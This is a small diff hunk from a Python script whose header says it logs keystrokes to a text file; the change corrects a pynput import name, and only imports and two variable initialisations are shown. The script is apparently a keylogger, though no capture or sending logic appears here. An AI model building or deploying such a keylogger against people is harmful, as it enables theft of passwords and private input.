@@ -2,7 +2,7 @@
 # Description: Logs keystrokes and saves them in a text file.
 
 import pynput
-from pynput.keyboard import Key, Listeners
+from pynput.keyboard import Key, Listener
 
 count = 0
 keys = []
